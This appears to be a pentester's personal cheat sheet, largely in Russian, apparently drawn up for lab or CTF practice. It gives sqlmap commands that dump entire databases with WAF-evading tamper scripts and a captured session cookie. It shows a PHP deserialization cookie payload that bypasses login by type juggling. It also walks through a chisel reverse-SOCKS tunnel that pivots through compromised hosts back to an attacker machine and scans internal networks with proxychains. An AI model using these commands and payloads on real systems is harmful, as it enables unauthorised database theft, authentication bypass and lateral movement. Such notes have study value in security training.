Notes
https://chatgptchatapp.com/
https://chatgptdemo.net/
https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html - Chisel Usage

Payloads
sqlmap -r /home/kali/Desktop/req.txt --batch --delay=0.3 -p expyear --exclude-sysdb --dump-all --random-agent --no-cast --dbms='MySQL' --tamper=randomcase.py,space2comment.py -v3

sqlmap -u "http://1.1.1.1/sql_lab/autumn?id=1" --current-db --batch --delay=0.3 --cookie='PHPSESSID=926fec1d5838dd2b981a998bb4b46828; session=eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2Vyc0xvZ2dlZCI6InNlZHlraCJ9.ZYFa5w.iey4la8yD3_ORwtflTcd5qhbJro' --no-cast
--dump-all --exclude-sysdb Выгрузить всё
--flush-session Очистить сессию
Папка темперов /usr/share/sqlmap/tamper/

Сериализация:
Допустим, приложение обрабатывает заголовок Cookie вида auth=a:2:{s:5:"login"%3bs:10:"validLogin"%3bs:6:"passwd"%3bs:11:"validPasswd"%3b}
Таким образом если мы отправим в заголовке Cookie auth=a:2:{s:5:"login"%3bb:1%3bs:6:"passwd"%3bb:1%3b} - приложение все еще нас пропустит. 
Это произошло потому, что вместостроковых значений "validLogin" и "validPasswd" было отправленологическое значение 1, которое в программировании считается True. 
В итоге внутри приложения выполнилось логическое равенство $data['login'] == True && $data['passwd'] == True, что и дало доступ. 
А выполнилось оно потому, что в программировании считается 0 - это False, а любое отличное от 0 - это True. 
И если сравнивать логическое True с непустой строкой, то получаем истину

CHISEL
Сначала нам нужно запустить сервер chisel, работающий на порту 8001 нашей машины злоумышленника, чтобы мы могли пройти через машину 10.10.101.50 и получить доступ к сети. Запустите команду ниже, чтобы запустить сервер
#Run command on attacker machine (10.10.101.51)
./chisel server -p 8001 --reverse

Перебрасываеем чисел на машиу пользоватля и соединяемся с нашим чисел серверов чтобы завершить туннель.
#Run command on Web Server machine (172.16.1.101 || 10.10.101.50)
./chisel client 10.10.101.51:8001 R:1080:socks

Теперь у нас есть реверсивный прокси и открытый порт 1080 на нашей машине. Теперь нужно отредактировать файл /etc/proxychains.conf
nano /etc/proxychains.conf
socks5 127.0.0.1 1080 (в самый конец)
Теперь у нас настроено соединение и с указанием проксичейнс можно выполнять различные запросы. Например:
proxychains4 nmap 172.16.1.1/24

Если нам потребуется пивотиться дальше делаем на первой из атакуемых машин сервер
./chisel server -p 8002 --reverse
А на второй атакуемой машине (на которую мы попали с первой) делаем клиент
./chisel client 172.16.1.101:8002 R:2080:socks
На нашу же собственную машину мы добавляем еще один прокси
nano /etc/proxychains.conf
socks5 127.0.0.1 2080 
